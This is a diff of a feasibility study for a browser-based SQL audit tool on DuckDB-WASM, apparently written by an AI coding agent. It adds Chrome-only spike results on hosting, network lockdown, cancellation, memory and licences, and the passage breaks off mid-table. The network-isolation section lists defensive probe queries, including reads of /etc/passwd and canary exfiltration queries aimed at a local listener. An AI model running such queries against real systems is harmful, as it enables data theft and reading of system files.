@@ -1,6 +1,6 @@
 # Feasibility Study
 
-> **Status: EXPERIMENT PLAN. NO EXPERIMENT HAS BEEN RUN.** Every experiment below is marked **NOT RUN**. This document contains no measurements, so nothing here is evidence of performance, capacity, privacy, or browser support.
+> **Status: EXPERIMENT PLAN + FIRST SPIKE RESULTS (2026-11-25), CORRECTED AFTER CODEX REVIEW (§10).** §9 is the original record of the first spike; statements in it that the review showed were overstated are marked *[Corrected: §10]*. Read §10 for the current evidence, acceptance matrix and qualification boundary. The browser-feasibility spike ran parts of E0–E8 and E11 **in Google Chrome only**, on the reference MacBook Air. Results, limitations and what was not run are in **[§9](#9-spike-results-2026-11-25)**. Each experiment heading shows its status. Experiments still marked **NOT RUN** have no measurements. Safari and Firefox were **not tested**, and nothing was deployed to the real GitHub Pages.
 >
 > Author: Claude Code (engineering evaluation of [COMPETITOR_RESEARCH.md](COMPETITOR_RESEARCH.md)), 2026-11-25.
 > Approval: each experiment that installs dependencies or writes code is a feasibility spike and needs its own scoped maintainer approval ([CLAUDE.md](../CLAUDE.md), P-010). All acceptance thresholds below are **proposed** and need maintainer approval before they are used as gates.
@@ -146,16 +146,16 @@ Steps 1–7 decide whether the engine and hosting model are viable. Step 8 decid
 
 | Pri | ID | Experiment | Decides | Status |
 |---|---|---|---|---|
-| P0 | E0 | Fixture generator and harness | Prerequisite for all | NOT RUN |
-| P0 | E1 | Static deployment and engine boot without isolation | P-002, P-003 (hosting) | NOT RUN |
-| P0 | E2 | Network isolation and configuration lockdown | P-003, P-013, D-004 | NOT RUN |
-| P0 | E3 | Join-audit correctness on DuckDB-WASM | Core algorithm, D-013/P-012 | NOT RUN |
-| P0 | E4 | Cancellation and recovery | P-003, P-004 | NOT RUN |
+| P0 | E0 | Fixture generator and harness | Prerequisite for all | RUN |
+| P0 | E1 | Static deployment and engine boot without isolation | P-002, P-003 (hosting) | PARTLY RUN (Chrome, local) |
+| P0 | E2 | Network isolation and configuration lockdown | P-003, P-013, D-004 | RUN (Chrome) |
+| P0 | E3 | Join-audit correctness on DuckDB-WASM | Core algorithm, D-013/P-012 | PARTLY RUN |
+| P0 | E4 | Cancellation and recovery | P-003, P-004 | RUN (Chrome) |
 | P1 | E5 | Query parsing for a single-join `SELECT` | Differentiation, MVP scope | NOT RUN |
-| P1 | E6 | Ingestion paths and memory characterisation (50 MB–1 GB) | D-009 workloads, supported limits | NOT RUN |
-| P1 | E7 | Browser matrix (Chromium, Firefox, Safari) | Supported browsers | NOT RUN |
-| P1 | E11 | Licence and notice audit of the pinned artifacts | Licence choice, redistribution | NOT RUN |
-| P2 | E8 | Result streaming and main-thread responsiveness | P-004, P-007 | NOT RUN |
+| P1 | E6 | Ingestion paths and memory characterisation (50 MB–1 GB) | D-009 workloads, supported limits | RUN (Chrome) |
+| P1 | E7 | Browser matrix (Chromium, Firefox, Safari) | Supported browsers | PARTLY RUN (Chrome only) |
+| P1 | E11 | Licence and notice audit of the pinned artifacts | Licence choice, redistribution | PARTLY RUN |
+| P2 | E8 | Result streaming and main-thread responsiveness | P-004, P-007 | PARTLY RUN |
 | P2 | E9 | Editor comparison (Monaco vs CodeMirror 6) | P-005 | NOT RUN |
 | P3 | E10 | OPFS spill and persistence | P-008 | NOT RUN (deferred) |
 
@@ -163,7 +163,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 
 ---
 
-### E0. Fixture generator and measurement harness: NOT RUN
+### E0. Fixture generator and measurement harness: RUN (§9.2)
 
 - **Goal:** reproducible inputs and a consistent way to record results.
 - **Inputs:** a seeded generator producing paired `left` and `right` relations in CSV and Parquet. Parameters: rows, key cardinality, key skew (uniform; Zipf-like; one hot key), NULL-key rate, duplicate rate, orphan rate on each side, composite-key arity (1–2), measure type (INTEGER, DECIMAL(18,2), DOUBLE), and row width (narrow ~5 columns; wide ~50 columns).
@@ -172,7 +172,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 - **Safeguards:** output only to git-ignored paths. Generation runs outside the browser (a script) so it cannot affect browser measurements.
 - **Acceptance (proposed):** the same seed produces identical checksums on two runs. Every fixture has a manifest with its parameters and expected answers (for corpus fixtures).
 
-### E1. Static deployment and engine boot without isolation: NOT RUN
+### E1. Static deployment and engine boot without isolation: PARTLY RUN (Chrome, local Pages-style server; §9.3)
 
 - **Question:** does a pinned single-thread DuckDB-WASM build load and run SQL from a static subpath with no COOP/COEP headers and no CDN?
 - **Inputs:** the production-style static build served at `/<repo>/` by a local static server with default headers. `crossOriginIsolated` must be `false`.
@@ -181,7 +181,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 - **Safeguards:** no external network (verified by E2 tooling). Throwaway code only.
 - **Acceptance (proposed):** the engine boots and runs both queries in all three browser families with `crossOriginIsolated === false`; zero requests leave the origin; asset sizes are recorded (no size threshold until the maintainer sets a budget). **Failure:** escalate. Fallbacks: a different bundle, or SQLite WASM (CSV-only).
 
-### E2. Network isolation and configuration lockdown: NOT RUN
+### E2. Network isolation and configuration lockdown: RUN in Chrome (§9.4)
 
 - **Question:** can the engine be configured so that no SQL can reach the network or load extensions, and is any extension needed for CSV, Parquet or JSON fetched at runtime?
 - **Inputs:** the E1 page with a candidate locked configuration *(candidates to verify in the pinned version: disable external access, disable extension auto-install and auto-load, lock the configuration)*. Canary values (unique random strings) planted in local data and in SQL text. A local-only logging listener on `127.0.0.1` used as the "external" target.
@@ -190,7 +190,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 - **Safeguards:** the listener never forwards anything. No real external host is contacted.
 - **Acceptance (proposed):** **zero** requests to anything but allowed same-origin assets; **zero** canary values seen by the listener; every escalation statement fails with an error the app can show; local file registration still works under the lock. CSV and Parquet must work without a runtime extension fetch, or with a same-origin, self-hosted extension that is checked against a recorded integrity hash. **Failure:** this blocks P-003 under P-013. Escalate to the maintainer.
 
-### E3. Join-audit correctness on DuckDB-WASM: NOT RUN
+### E3. Join-audit correctness on DuckDB-WASM: PARTLY RUN (generator known answers only; corpus NOT RUN; §9.6)
 
 - **Question:** do the research's probe queries give exact answers in the pinned DuckDB-WASM, matching a directly materialised join?
 - **Inputs:** the E0 known-answer corpus, covering every case in the research's verification strategy: one-to-one; intended many-to-many; unwanted one-to-many; orphans on both sides; repeated NULL keys; composite keys with a partial NULL; empty relations; DECIMAL, DOUBLE and negative measures; fan-out with a net-zero sum; fan-out plus loss with unchanged row counts; LEFT JOIN with a NULL-rejecting WHERE; a nullable right value inside a real match; mismatched key types. Plus at least 500 seeded random fixtures (small: ≤ 1,000 rows each).
@@ -199,7 +199,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 - **Safeguards:** fixtures are synthetic and tiny. The test runs in the browser and also in a headless runner if the spike approval allows one.
 - **Acceptance (proposed):** **100 % agreement** on integer counts and integer/DECIMAL sums. DOUBLE sums agree within a documented tolerance. Mismatched key types are reported as unsupported, not analysed. With no declared grain, no fixture is labelled "confirmed issue". With a declared grain, every violating fixture is labelled "confirmed issue" and no compliant fixture is. **Any mismatch fails E3.**
 
-### E4. Cancellation and recovery: NOT RUN
+### E4. Cancellation and recovery: RUN in Chrome (§9.5)
 
 - **Question:** can a running audit be stopped quickly, and how long does it take to get back to a usable state?
 - **Inputs:** a stress case designed to run for 30 seconds or more: one hot key on both sides (pathological fan-out), plus a 200 MB CSV import. Data is attached two ways: (a) imported into tables, (b) file-backed views.
@@ -217,7 +217,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 - **Safeguards:** no regex-based SQL splitting. Parsing runs under the E2 lockdown, which also shows whether the needed function requires a network extension.
 - **Acceptance (proposed):** **zero queries wrongly accepted** (an unsupported query treated as supported); extraction is correct for at least 95 % of supported queries, with the rest refused rather than mis-analysed; the parser works under lockdown. **Failure:** the MVP falls back to the research's relations-first audit. That is a product decision for the maintainer (§2.1).
 
-### E6. Ingestion paths and memory characterisation: NOT RUN
+### E6. Ingestion paths and memory characterisation: RUN in Chrome (§9.6, §9.7)
 
 - **Question:** what workloads work on the reference machine, and how do they fail?
 - **Inputs:** the E0 size ladder of 50, 200, 500 and 1,000 MB **per relation** (also record totals), in CSV and Parquet, narrow and wide, uniform and skewed keys.
@@ -226,14 +226,14 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 - **Safeguards:** the machine-safety rules in §6.0, with the DuckDB memory limit set explicitly to below the observed browser ceiling so failures surface as recoverable errors where possible.
 - **Acceptance (proposed):** 50 MB per relation, CSV and Parquet, uniform keys: audit succeeds in Chromium, Firefox and Safari with no renderer crash. Above 50 MB: **characterisation only.** Every result is published as measured, with no pass/fail claim, until the maintainer sets support targets from the data. The output is the first draft of a support matrix.
 
-### E7. Browser matrix: NOT RUN
+### E7. Browser matrix: PARTLY RUN (Chrome only; Safari and Firefox NOT RUN; §9.9)
 
 - **Inputs:** current stable desktop Chrome (or another Chromium browser), Firefox and Safari on the reference machine. Record the exact versions.
 - **Workload:** E1, E2, E3 (corpus only), E4 (5 cycles) and E6 at 50 MB. File input with the standard `<input type=file>`, plus the enhanced file picker where the browser supports it.
 - **Measurements:** pass or fail for each step in each browser, plus any browser-specific errors.
 - **Acceptance (proposed):** all steps pass in all three. A browser that fails is listed as unsupported with the reason, never hidden.
 
-### E8. Result streaming and main-thread responsiveness: NOT RUN
+### E8. Result streaming and main-thread responsiveness: PARTLY RUN (bounded results and responsiveness; 10,000-row rendering NOT RUN; §9.6)
 
 - **Inputs:** a 1M-row result from the E6 50 MB fixture.
 - **Workload:** stream record batches and render the first 100 and first 10,000 rows in a plain HTML table, then scroll.
@@ -250,7 +250,7 @@ E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and es
 
 Deferred until after the MVP decision. If run: quota and eviction behaviour, explicit deletion, private-browsing failure, and exposure on a shared `github.io` origin (§4.2).
 
-### E11. Licence and notice audit: NOT RUN
+### E11. Licence and notice audit: PARTLY RUN (npm packages only; §9.8)
 
 - **Inputs:** the exact pinned release artifacts from E1 (npm tarballs, `.wasm` files, any extension binaries) and their licence and notice files.
 - **Workload:** list every redistributed file and its licence, including third-party code bundled into the WASM binary.
@@ -274,3 +274,535 @@ Deferred until after the MVP decision. If run: quota and eviction behaviour, exp
 4. Which experiments may install which dev dependencies (e.g. DuckDB-WASM, Vite, a browser-automation tool)?
 5. Is a throwaway real GitHub Pages deployment allowed for E1/E2, and on which repository?
 6. Are shareable query links ever in scope, given the exfiltration risk in §4.2?
+
+## 9. Spike results (2026-11-25)
+
+Prototype: [`spikes/browser-feasibility/`](../spikes/browser-feasibility/README.md) on branch `spike/browser-feasibility`. Throwaway code (P-010). Every number below was measured in this session. Raw per-run JSON is git-ignored under `spikes/browser-feasibility/results/raw/`; the curated summary is [`results/summary.json`](../spikes/browser-feasibility/results/summary.json). All commands are in the spike README.
+
+### 9.1 Environment and method
+
+| Item | Value |
+|---|---|
+| Hardware | MacBook Air (Mac14,2), Apple M2, 8 GB RAM. The D-009 reference machine |
+| OS | macOS 26.5.2 (25F84) |
+| Browser | Google Chrome 158.0.8127.37, driven by Playwright 1.65.1 (channel `chrome`, **headless**, fresh profile per run) |
+| Engine | `@duckdb/duckdb-wasm` **1.33.1-dev57.0** (npm `latest` tag), DuckDB **v1.5.4**, `eh` bundle selected, single-threaded, `crossOriginIsolated = false` |
+| Engine settings | `threads = 1`, `memory_limit = 2GB` unless stated, lockdown on (§9.4) |
+| Build | React 19.3.1, Vite 8.3.8, TypeScript 7.0.2 (strict), apache-arrow 17.0.0 (the version DuckDB-WASM requires) |
+| Serving | `vite preview` at `/queryverdict/`: no COOP/COEP/CSP headers, like GitHub Pages. **Not** the real GitHub Pages |
+| Machine state | Before each run the macOS memory-free level was 36–59 % and 3.8–5.2 GB of swap was in use (other applications open). Recorded per run |
+| Data | Seeded synthetic `orders` and `customers` (seed 20261125). Fan-out: 1 % of customer keys appear 3 times. Row loss: 2 % of order keys have no customer. Expected answers computed by the generator |
+| Repetitions | 3 per workload; cancel workloads 5 (20 for the 50 MB CSV leak check). Timings are medians |
+
+**Caveats for every number:** single machine, single browser, headless; the data files had just been written, so they were probably in the OS file cache (warm I/O); other apps were running. Treat timings as indicative, not as published limits.
+
+**Memory labels:** *OS RSS* = actual `ps` RSS of the Chrome process tree, sampled every 250 ms (over-counts shared pages; excludes compressed/swapped pages). *Engine* = DuckDB `duckdb_memory()` (buffer manager only). *Browser API* = Chromium `performance.memory` (main-thread JS heap only; excludes the engine worker). `performance.measureUserAgentSpecificMemory()` was **unavailable** because the page is not cross-origin isolated, confirming that assumption. No estimate is shown as a measurement.
+
+### 9.2 E0: generator and harness
+
+- `scripts/generate_datasets.py`: identical seed gives byte-identical files (unit-tested); expected answers are re-checked against a direct recount (unit-tested). Generation took 6 s (50 MB) to 80 s (1 GB) including Parquet conversion.
+- Sizes are defined by the orders **CSV** file. The same rows are about 0.43–0.46× as Parquet and 2.2× as NDJSON.
+- NDJSON was generated and benchmarked only at 50 MB and 200 MB (as planned).
+
+### 9.3 E1: static hosting and engine boot
+
+- The production build loads and runs SQL from `/queryverdict/` with **no COOP/COEP headers** and `crossOriginIsolated = false`, using the single-threaded `eh` bundle. The threads (`coi`) bundle is excluded from the build.
+- Requests on first load (Chrome): page, app JS/CSS, engine worker, `duckdb-eh.wasm`, and the two self-hosted extensions. All same-origin.
+- Engine boot on localhost (5 runs): **cold median 549 ms, warm median 510 ms** (instantiate, open, lockdown, extension load). Network download time is **not** included; on a real connection it will dominate.
+
+| Asset | Bytes (uncompressed) | gzip -9 (local estimate) | brotli 11 (local estimate) |
+|---|---:|---:|---:|
+| `duckdb-eh.wasm` | 35,913,747 | 8,054,501 | 5,452,859 |
+| `parquet` extension (eh) | 3,218,307 | 736,749 | 522,051 |
+| `json` extension (eh) | 821,413 | 192,377 | 127,983 |
+| engine worker JS (eh) | 773,223 | 187,988 | 155,857 |
+| app JS (React + engine glue) | 438,519 | 120,229 | 103,157 |
+| **First visit, eh path** | **≈ 41.2 MB** | **≈ 9.3 MB** | **≈ 6.4 MB** |
+
+- The `mvp` fallback bundle (41.3 MB) is also in the build but was not downloaded by Chrome.
+- **Not verified:** whether GitHub Pages compresses `.wasm` (it determines whether a visit costs about 6–9 MB or 41 MB). The research's 100 GB/month soft limit would allow very roughly 2,400 (uncompressed) to 15,000 (brotli) cold visits. *That is arithmetic on the table above, not a measurement or forecast.*
+- **Not verified:** a real GitHub Pages deployment, MIME types served by Pages, cache behaviour after redeploys.
+
+### 9.4 E2: network isolation
+
+**Findings that change earlier assumptions:**
+
+1. **Parquet and JSON readers are not built into DuckDB-WASM v1.5.4.** Only `core_functions` is statically linked. By default the engine **downloads extensions from `https://extensions.duckdb.org` at runtime**, which the negative control observed. The default configuration therefore makes third-party requests as soon as a JSON or Parquet file is read.
+2. **The page's `<meta>` CSP (`connect-src 'self'`) does not restrict the engine's worker.** With lockdown off, the worker reached a local "external" listener and `extensions.duckdb.org` despite the CSP (Chrome 158). On GitHub Pages, which cannot send CSP headers, **the engine lockdown is the only effective control.** The meta CSP is kept, but only as defence in depth for the page itself.
+
+**Lockdown used** (`src/engine/lockdown.ts`, applied before any user file is registered):
+- the extension repository points at the app's own origin;
+- auto-install and auto-load are off, and community extensions are off;
+- `parquet` and `json` are loaded explicitly from the same-origin files;
+- `allowed_directories = ['/qv-local/']`, where user files are registered;
+- `enable_external_access = false`;
+- `lock_configuration = true`.
+
+Extension binaries are fetched at build time and checked against SHA-256 hashes in `extensions.lock.json`. At runtime `allowUnsignedExtensions = false`, but **runtime signature checking by the engine was not independently verified.**
+
+**Results (Chrome, automated test `lockdown blocks every …`):**
+- **19 of 21 escalation probes fail with an engine error:**
+  - remote `read_csv`, `read_parquet`, `read_json`, `read_text`, `read_blob` and `glob`;
+  - `FROM 'http://…'`, `ATTACH`, `COPY TO` and `EXPORT DATABASE` to a URL;
+  - `LOAD httpfs` and `LOAD <url>`;
+  - re-enabling external access or auto-load, changing the extension repository, widening `allowed_directories`, unlocking or resetting the lock;
+  - reading `/etc/passwd`.
+- **2 probes return without error: `INSTALL httpfs` and `INSTALL <url>`.** They made no network request and loaded nothing (asserted: the loaded extensions are exactly `core_functions`, `json`, `parquet`). In the WASM build, `INSTALL` appears to defer fetching to `LOAD`, which is blocked. This deviates from the proposed criterion that *every* escalation errors. Recorded, not hidden.
+- With a canary string planted in a registered CSV, exfiltration attempts such as `read_csv('<listener>/x?d=' || secret)` and `COPY … TO '<listener>'` failed. The local listener received **0 requests**, and **no request** from the page or worker left the app origin or contained the canary.
+- **Negative control** (lockdown off): the listener received requests. This proves the capture method sees worker traffic.
+- User files registered as browser `File` handles under `/qv-local/` remain readable with external access disabled.
+
+**Not covered:** other browsers; DuckDB functions not in the probe list; denial-of-service through expensive SQL (handled by cancel and timeouts, §9.5); the threat of a malicious *app* build (supply chain).
+
+### 9.5 E4: cancellation and recovery
+
+- Queries always use the streaming API (`conn.send`). **All 160 benchmark cancellations were cooperative** (`cancelSent`); the worker never had to be terminated. (A further 14 cancel-workload runs finished before the cancel fired and are not counted.) Stop time (cancel request to query settled), across all sizes and formats:
+  - CPU-bound join: **≤ 102 ms**;
+  - during a blocking full sort: **≤ 264 ms**.
+  - In every case a follow-up query succeeded.
+- Some sorts finished before the cancel fired (Parquet 50 MB, imported CSV 50 MB). Those runs are labelled as such in §9.6 and are not counted as cancellations.
+- **Leak check, 20 cycles × 2 workloads (50 MB CSV):**
+  - engine memory after each cycle: 0 bytes;
+  - main-thread JS heap: 5.0–10.8 MB, with no upward trend;
+  - renderer RSS peak: 381 MB at cycle 1, 363 MB at cycle 20.
+  - **No leak observed** within 20 cycles.
+- **Forced termination path** (automated test): restarting the worker mid-query drops the stale result (`cancelled`/`stale`), re-applies the lockdown and re-attaches files in both view and table modes.
+  - Re-attach cost at scale was **not measured on the restart path**. It should equal the registration cost: about 0.1 s for a file view, and up to 9.1 s for re-importing a 1 GB CSV table (§9.6). That figure is an inference.
+- **Not measured:** the time from clicking Cancel to the UI acknowledging it. The cancel API returned in milliseconds, but a separate UI-acknowledgement timing was not instrumented.
+
+### 9.6 E6/E8/E3: workloads at 50 MB → 1 GB (Chrome)
+
+Smallest sizes first; each step only after the previous one completed. Two attach modes:
+- **file view:** `CREATE VIEW … AS SELECT * FROM read_*(file)`; the file is re-read by every query;
+- **imported table:** `CREATE TABLE … AS SELECT …`; the data is held in the engine's memory.
+
+**50MB**: 683,058 orders rows. On disk: orders.csv 50 MB, orders.parquet 21 MB, orders.ndjson 112 MB; customers.csv 1.2 MB (26,839 rows).
+
+| Workload (median of 3) | CSV file view | PARQUET file view | JSON file view | CSV imported table |
+|---|---:|---:|---:|---:|
+| Register orders file | 129 ms | 15 ms | 119 ms | 417 ms |
+| schema_orders | 68 ms | 2 ms | 81 ms | 1 ms |
+| preview_100 | 65 ms | 34 ms | 116 ms | 2 ms |
+| count_orders | 182 ms | 1 ms | 272 ms | 1 ms |
+| filter_count | 180 ms | 6 ms | 334 ms | 13 ms |
+| aggregate_by_region | 204 ms | 23 ms | 351 ms | 15 ms |
+| sort_topn_100 | 194 ms | 34 ms | 336 ms | 15 ms |
+| sort_full_first_100 | 371 ms | 250 ms | 538 ms | 126 ms |
+| equi_join_count_sum | 229 ms | 37 ms | 404 ms | 14 ms |
+| fanout_key_multiplicity | 30 ms | 3 ms | 29 ms | 3 ms |
+| fanout_left_join_rows | 227 ms | 20 ms | 327 ms | 11 ms |
+| rowloss_unmatched_orders | 218 ms | 15 ms | 335 ms | 9 ms |
+| cancel_heavy_join | cooperative, stop ≤ 102 ms (20/20) | cooperative, stop ≤ 10 ms (5/5) | cooperative, stop ≤ 101 ms (5/5) | cooperative, stop ≤ 12 ms (5/5) |
+| cancel_during_full_sort | cooperative, stop ≤ 149 ms (20/20) | finished before cancel fired (235 ms) | cooperative, stop ≤ 71 ms (5/5) | finished before cancel fired (124 ms) |
+| All answers match known values | yes | yes | yes | yes |
+| Max frame gap (any workload) | 17 ms | 17 ms | 17 ms | 17 ms |
+| Peak OS RSS: Chrome tree / renderer | 1047 / 613 MB | 1117 / 630 MB | 1185 / 710 MB | 1043 / 575 MB |
+
+**200MB**: 2,690,778 orders rows. On disk: orders.csv 200 MB, orders.parquet 88 MB, orders.ndjson 445 MB; customers.csv 4.9 MB (107,367 rows).
+
+| Workload (median of 3) | CSV file view | PARQUET file view | JSON file view | CSV imported table |
+|---|---:|---:|---:|---:|
+| Register orders file | 110 ms | 27 ms | 113 ms | 1.35 s |
+| schema_orders | 74 ms | 2 ms | 90 ms | 1 ms |
+| preview_100 | 58 ms | 22 ms | 107 ms | 3 ms |
+| count_orders | 576 ms | 2 ms | 760 ms | 1 ms |
+| filter_count | 558 ms | 20 ms | 975 ms | 40 ms |
+| aggregate_by_region | 638 ms | 88 ms | 1.10 s | 56 ms |
+| sort_topn_100 | 618 ms | 138 ms | 1.09 s | 23 ms |
+| sort_full_first_100 | 1.49 s | 1.09 s | 1.97 s | 513 ms |
+| equi_join_count_sum | 687 ms | 154 ms | 1.15 s | 52 ms |
+| fanout_key_multiplicity | 41 ms | 6 ms | 44 ms | 4 ms |
+| fanout_left_join_rows | 626 ms | 80 ms | 1.04 s | 40 ms |
+| rowloss_unmatched_orders | 622 ms | 61 ms | 1.03 s | 30 ms |
+| cancel_heavy_join | cooperative, stop ≤ 91 ms (5/5) | cooperative, stop ≤ 14 ms (5/5) | cooperative, stop ≤ 40 ms (5/5) | cooperative, stop ≤ 14 ms (5/5) |
+| cancel_during_full_sort | cooperative, stop ≤ 71 ms (5/5) | cooperative, stop ≤ 83 ms (5/5) | cooperative, stop ≤ 86 ms (5/5) | cooperative, stop ≤ 264 ms (5/5) |
+| All answers match known values | yes | yes | yes | yes |
+| Max frame gap (any workload) | 17 ms | 17 ms | 17 ms | 17 ms |
+| Peak OS RSS: Chrome tree / renderer | 1200 / 752 MB | 1240 / 758 MB | 1290 / 865 MB | 1375 / 890 MB |
+
+**500MB**: 6,649,369 orders rows. On disk: orders.csv 500 MB, orders.parquet 229 MB; customers.csv 12.7 MB (268,419 rows).
+
+| Workload (median of 3) | CSV file view | PARQUET file view | CSV imported table |
+|---|---:|---:|---:|
+| Register orders file | 112 ms | 21 ms | 3.49 s |
+| schema_orders | 62 ms | 3 ms | 1 ms |
+| preview_100 | 69 ms | 23 ms | 5 ms |
+| count_orders | 1.42 s | 2 ms | 2 ms |
+| filter_count | 1.36 s | 47 ms | 93 ms |
+| aggregate_by_region | 1.50 s | 210 ms | 132 ms |
+| sort_topn_100 | 1.45 s | 302 ms | 46 ms |
+| sort_full_first_100 | 3.88 s | 2.90 s | 1.32 s |
+| equi_join_count_sum | 1.66 s | 435 ms | 132 ms |
+| fanout_key_multiplicity | 66 ms | 14 ms | 9 ms |
+| fanout_left_join_rows | 1.55 s | 224 ms | 100 ms |
+| rowloss_unmatched_orders | 1.51 s | 191 ms | 74 ms |
+| cancel_heavy_join | cooperative, stop ≤ 98 ms (5/5) | cooperative, stop ≤ 18 ms (5/5) | cooperative, stop ≤ 17 ms (5/5) |
+| cancel_during_full_sort | cooperative, stop ≤ 61 ms (5/5) | cooperative, stop ≤ 72 ms (5/5) | cooperative, stop ≤ 58 ms (5/5) |
+| All answers match known values | yes | yes | yes |
+| Max frame gap (any workload) | 17 ms | 17 ms | 17 ms |
+| Peak OS RSS: Chrome tree / renderer | 1382 / 1141 MB | 1422 / 935 MB | 1515 / 1085 MB |
+
+**1GB**: 13,205,164 orders rows. On disk: orders.csv 1000 MB, orders.parquet 461 MB; customers.csv 25.5 MB (536,839 rows).
+
+| Workload (median of 3) | CSV file view | PARQUET file view | CSV imported table |
+|---|---:|---:|---:|
+| Register orders file | 135 ms | 32 ms | 9.08 s |
+| schema_orders | 86 ms | 6 ms | 1 ms |
+| preview_100 | 75 ms | 36 ms | 9 ms |
+| count_orders | 3.47 s | 6 ms | 4 ms |
+| filter_count | 3.72 s | 121 ms | 264 ms |
+| aggregate_by_region | 4.51 s | 570 ms | 360 ms |
+| sort_topn_100 | 4.53 s | 744 ms | 113 ms |
+| sort_full_first_100 | 11.80 s | 8.31 s | 3.95 s |
+| equi_join_count_sum | 5.27 s | 1.17 s | 413 ms |
+| fanout_key_multiplicity | 162 ms | 48 ms | 28 ms |
+| fanout_left_join_rows | 4.80 s | 691 ms | 346 ms |
+| rowloss_unmatched_orders | 4.59 s | 601 ms | 270 ms |
+| cancel_heavy_join | cooperative, stop ≤ 88 ms (5/5) | cooperative, stop ≤ 28 ms (5/5) | cooperative, stop ≤ 49 ms (5/5) |
+| cancel_during_full_sort | cooperative, stop ≤ 126 ms (5/5) | cooperative, stop ≤ 87 ms (5/5) | cooperative, stop ≤ 63 ms (5/5) |
+| All answers match known values | yes | yes | yes |
+| Max frame gap (any workload) | 33 ms | 17 ms | 17 ms |
+| Peak OS RSS: Chrome tree / renderer | 1328 / 1148 MB | 1846 / 1354 MB | 1797 / 1407 MB |
+
+**Workload definitions** (`src/bench/runner.ts`):
+- `count_orders` uses Parquet metadata for Parquet files, which explains the near-zero times.
+- `sort_full_first_100` sorts every row (`ORDER BY note DESC, order_id`) and keeps only the first 100 rows.
+- `sort_topn_100` uses `LIMIT 100` (a top-N sort).
+- The join is `orders ⋈ customers` on `customer_id`, where customers is the small side.
+- The three fan-out/row-loss queries are checked against the generator's exact counts.
+
+**Correctness:** *[Corrected: §10.5]* the 19 benchmark runs (14 main runs, 1 smoke run, 4 stress/boundary runs) contain 703 workload records, of which **517 are answer-check assertions** (all 517 passed). The other 186 are 160 exercised cancellations, 14 cancel workloads that finished before the cancel fired, 9 stress workloads without answer checks and 3 expected out-of-memory errors. The earlier wording that every one of 703 records was a passing correctness check was wrong. This covers row counts, filtered counts, per-region counts, exact cent totals, inner and left join row counts, duplicated keys, excess rows and unmatched rows. **This is not E3.** The research's known-answer corpus (composite keys, NULL keys, empty relations, type mismatches, net-zero cases) was **NOT RUN**.
+
+**Responsiveness:**
+- Across all 703 workload records, Chrome reported **0 long tasks** (main-thread blocks > 50 ms).
+- The worst frame gap was **33 ms** (1 GB CSV view), with 17 ms (one frame at 60 Hz) everywhere else. *[Corrected: §10.6]* **84 of the 703 records have no frame-gap sample** (the workload ended before the first animation frame); the frame-gap figures cover the other 619 only. All runs were headless and exercised bounded benchmark probes; they do not establish visible-window interaction latency.
+- Headless Chrome was used. Frame-gap results should be repeated in a visible window and on other browsers.
+
+**Bounded results:** the automated test confirms that a 2,000,000-row result delivers exactly 1,000 rows to the UI, is flagged as truncated, and leaves the engine free for the next query. Rendering 10,000 rows (E8) was **NOT RUN**.
+
+### 9.7 Boundary characterisation
+
+Opt-in stress workloads, all run under the safety rules: grouping by every row; self-join of orders on `customer_id`; `count(DISTINCT note)`.
+
+| Run | Result |
+|---|---|
+| 200 MB Parquet view, memory_limit 2 GB | All completed: 0.25 s / 1.16 s / 0.46 s. Peak RSS 1,184 / 637 MB |
+| 1 GB Parquet view, memory_limit 2 GB | All completed: 1.57 s / 6.54 s / 2.41 s. Peak RSS 1,570 / 1,103 MB |
+| 1 GB CSV imported table, memory_limit 2 GB | All completed: 1.25 s / 6.46 s / 1.63 s. Peak RSS 1,906 / 1,490 MB (the highest of the spike) |
+| 1 GB Parquet view, **memory_limit 256 MB** | All three failed with **`Out of Memory Error`** within 0.55–0.83 s. Engine memory returned to 0 and later queries kept working. **The failure was a recoverable error, not a crash.** |
+
+**What this shows:** with a DuckDB memory limit set below the browser's practical limit, overload has so far surfaced as a recoverable engine error. Engine temporary storage stayed at 0: no disk spilling was configured (OPFS spill, E10, not run).
+
+**Deliberately not run (safety):** removing or raising the memory limit to push the WASM heap towards its 4 GB ceiling. On this 8 GB machine with more than 5 GB of swap already in use, that risks a renderer crash or a system stall. **The behaviour at the true browser ceiling (crash vs error) is therefore unknown.** Also not run: large-to-large joins with large outputs, wide tables (~50 columns), skewed keys.
+
+### 9.8 E11: licences (partial)
+
+- All production npm packages installed for the spike are MIT, Apache-2.0 (`apache-arrow`, `flatbuffers`, `@swc/helpers`), BSD-3-Clause (`qs`) or 0BSD (`tslib`). These are compatible with either MIT or Apache-2.0 as the project licence.
+- **Gap:** the installed `@duckdb/duckdb-wasm` package contains **no LICENSE or third-party notice file** (its `package.json` declares MIT). The `.wasm` binaries and the `parquet`/`json` extensions compile in third-party code whose notices have not been collected. This must be resolved from DuckDB's source repository at the pinned version before any public deployment.
+
+### 9.9 Not run in this spike
+
+| Item | Status | Reason |
+|---|---|---|
+| Safari | NOT RUN | Cannot be automated without enabling Safari remote automation (a maintainer setting). The manual benchmark panel exists |
+| Firefox | NOT RUN | Not installed on the machine |
+| Real GitHub Pages deployment | NOT RUN | Needs separate approval (§6.0). Local subpath emulation only |
+| E3 known-answer corpus | NOT RUN | Out of this spike's scope |
+| E5 query parsing | NOT RUN | Only checked that `json_serialize_sql` works under lockdown (automated test) |
+| E9 editor, E10 OPFS | NOT RUN | Deferred by plan |
+| JSON at 500 MB / 1 GB | NOT RUN | Per plan (JSON limited to 50/200 MB) |
+| Memory-ceiling crash test | NOT RUN | Safety (§9.7) |
+| Cancel UI-acknowledgement timing, restart-path re-attach at scale | NOT MEASURED | §9.5 |
+| Visible-window (non-headless) runs | NOT RUN | Benchmarks used headless Chrome |
+
+### 9.10 Against the proposed acceptance criteria (§6)
+
+| Criterion | Result |
+|---|---|
+| E1: boots without isolation; no requests outside the origin | **Met in Chrome.** Other browsers not tested |
+| E2: zero external requests, zero canary leaks, registration works under the lock | **Met in Chrome** *[Corrected: §10.1 — this build's startup was fail-open (Codex finding 1); the result is superseded by the fail-closed build's tests in §10]* |
